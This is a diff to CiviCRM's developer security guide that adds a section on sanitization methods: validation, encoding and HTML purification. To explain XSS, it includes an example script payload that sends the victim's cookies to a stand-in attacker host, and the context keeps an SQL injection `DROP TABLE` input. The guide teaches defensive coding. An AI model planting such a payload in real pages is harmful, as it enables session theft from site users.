@@ -35,9 +35,9 @@ With this attack, the response page would display the API key (for any contact t
 !!! note
     You might think that an input like ``0; DROP TABLE `civicrm_contact` `` would present an [even more serious a vulnerability](https://xkcd.com/327/), but fortunately CiviCRM does not allow [query stacking](http://www.sqlinjection.net/stacked-queries/) which means `executeQuery()` can only execute one query at a time.
 
-### A improvement using sanitizing
+### An improvement using sanitizing
 
-In order to fix this security vulnerability, we need to sanitize either (or both!) the input or output as follows:
+In order to fix this security vulnerability, we need to sanitize either the input or output (or both!) as follows:
 
 ```php
 $contactId = CRM_Utils_Request::retrieve(
@@ -55,6 +55,39 @@ $displayName = CRM_Core_DAO::executeQuery($query, array(
 ```
 
 Now, users will only be able to send integers in, and CiviCRM will only be able to send integers out. This is obviously a simplified example, but it illustrates the concepts of inputs, outputs, and sanitizing.
+
+
+## Sanitization methods
+
+Sanitizing (also sometimes generally called "**escaping**") refers the process of cleaning (or rejecting) data to protect against attacks.
+
+### Validation
+
+The most primitive way to sanitize untrusted data (as in the example above) is to throw an error when it does not conform to the expected format. This works well for data inputs which are of known (and simple) types, but can be much more difficult (and less effective) when used for *outputs* or complex data types.
+
+### Encoding (aka "escaping") {:#encoding}
+
+Encoding alters the untrusted data to suit a *specific output*.
+
+For example, consider the following Smarty code:
+
+```html
+<div class="email">{$emailAddress}</div>
+```
+
+This works fine with an input of `foo@example.org`. But a string like `<script>window.location='http://attacker.example.com/?cookie='+document.cookie</script>` would present an [XSS](https://excess-xss.com/) vulnerability. If loaded in a victim's browser, this string would send the victim's cookies to the attacker's website and allow the attacker to masquerade as the user.
+
+Using validation to reject email addresses characters like `<` or `>` would prevent the attack, but it would also prevent us from displaying email addresses like `Foo Bar <foo@example.org>`.
+
+By *encoding* the data (for HTML), we change `Foo Bar <foo@example.org>` to `Foo Bar &lt;foo@example.org&gt;`. This prevents the attack and allows us to display any characters we wish.
+
+!!! important
+    Encoding is specific to output mechanisms. Data embedded within HTML must be encoded differently from data embedded in an SQL query or a shell command.
+
+### Purification
+
+In rare cases such as user-editable rich text fields, CiviCRM cannot use validation or encoding to protect against attacks because the same characters used in attacks are also necessary for presentation. For these cases, CiviCRM uses a 3rd-party library called [HTML Purifier](http://htmlpurifier.org/) which employs sophisticated techniques to [remove XSS](http://htmlpurifier.org/live/smoketests/xssAttacks.php) from HTML strings.
+
 
 ## Escape on Input v Escape on Output
 
